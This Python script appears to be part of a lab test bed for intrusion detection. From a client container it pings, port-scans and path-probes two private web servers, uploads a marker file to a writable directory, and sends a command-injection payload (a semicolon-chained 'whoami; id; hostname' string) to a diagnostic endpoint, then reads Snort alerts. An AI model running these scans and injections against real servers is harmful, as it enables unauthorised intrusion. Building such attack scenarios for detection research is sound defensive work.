"""
Execute a web-server-only attack against server_web1 and server_web2.

This scenario runs from the client container (10.0.1.11) and intentionally
targets only:
- server_web1 at 10.0.2.14
- server_web2 at 10.0.2.15

It does not probe or attack server_ssh, server_samba, or server_shellshock.

The two web targets intentionally exercise different compromise paths:
- server_web1: HTTP upload/write into a web-accessible directory.
- server_web2: web diagnostic endpoint command injection.
"""

from __future__ import annotations

import logging
import sys
import time
from pathlib import Path

ROOT = Path(__file__).resolve().parent
SRC = ROOT / "src"
if str(SRC) not in sys.path:
    sys.path.insert(0, str(SRC))

from llm_ir_dt.docker_manager.docker_manager import DockerManager


logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s [%(levelname)8s] %(message)s "
    "(%(filename)s:%(lineno)s)",
)
logger = logging.getLogger(__name__)

CLIENT = "client"
WEB_TARGETS = ("10.0.2.14", "10.0.2.15")
SERVER_WEB1 = "10.0.2.14"
SERVER_WEB2 = "10.0.2.15"


def run(command: str) -> str:
    """Execute a command in the client container and log the result."""
    result = DockerManager.exec_run(CLIENT, command)
    logger.info("[exit=%s] %s", result["exit_code"], command)
    output = str(result.get("output", "")).strip()
    if output:
        logger.info("Output:\n%s", output)
    return output


def main() -> None:
    """Run the web-only attack and print resulting Snort alerts."""
    logger.info("=== Stage 1: Reconnaissance against web servers only ===")
    for target in WEB_TARGETS:
        run(f"ping -c 3 {target}")
        time.sleep(0.3)

    logger.info("=== Stage 2: Service scanning for distinct web scenarios ===")
    run(f"nmap -sT -Pn -p 80,8080 {SERVER_WEB1}")
    time.sleep(0.3)
    run(f"nmap -sT -Pn -p 80,8081 {SERVER_WEB2}")
    time.sleep(0.3)

    logger.info("=== Stage 3: HTTP probing and path discovery ===")
    paths = ("/", "/index.html", "/admin", "/login", "/server-status")
    for target in WEB_TARGETS:
        for path in paths:
            run(
                "curl -s -o /dev/null "
                "-w 'target=%{remote_ip} path="
                f"{path} status=%{{http_code}}\\n' "
                f"http://{target}{path}"
            )
            time.sleep(0.2)

    logger.info("=== Stage 4: Repeated HTTP requests to generate IDS evidence ===")
    for target in WEB_TARGETS:
        run(
            "curl -s -o /dev/null "
            f"http://{target}/ "
            f"http://{target}/index.html "
            f"http://{target}/admin "
            f"http://{target}/login"
        )

    logger.info("=== Stage 5: Web writable-directory check on server_web1 ===")
    run(
        "printf 'web1 upload marker from client\\n' "
        "> /tmp/observed_web1_file.txt"
    )
    run(
        "curl -s -o /tmp/web1_upload_response.txt "
        "-w 'upload_status=%{http_code}\\n' "
        "--data-binary @/tmp/observed_web1_file.txt "
        f"'http://{SERVER_WEB1}:8080/upload?name=observed_web1_file.txt'"
    )
    run("cat /tmp/web1_upload_response.txt 2>/dev/null || true")
    run(
        "curl -s -w '\\nfetch_status=%{http_code}\\n' "
        f"http://{SERVER_WEB1}/uploads/observed_web1_file.txt"
    )

    logger.info("=== Stage 6: Command injection check on server_web2 ===")
    run(
        "curl -s --get "
        "--data-urlencode "
        "\"target=127.0.0.1; pwd; whoami; id; hostname; "
        "echo web2 command injection marker from client "
        "> /tmp/observed_web2_command_injection.txt; "
        "cat /tmp/observed_web2_command_injection.txt\" "
        f"http://{SERVER_WEB2}:8081/diag 2>&1 || true"
    )

    logger.info("=== Web-server attack complete. Reading alerts... ===")
    time.sleep(3)
    alerts = DockerManager.read_alerts()
    logger.info("Total alerts: %d", len(alerts["alerts"]))
    for alert in alerts["alerts"]:
        logger.info(
            "Alert: [pri=%s cls=%s] {%s} %s -> %s %s",
            alert.get("priority", "-"),
            alert.get("classification", "-"),
            alert.get("protocol", "-"),
            alert.get("source", "-"),
            alert.get("destination", "-"),
            alert.get("message", alert["raw"]),
        )


if __name__ == "__main__":
    main()
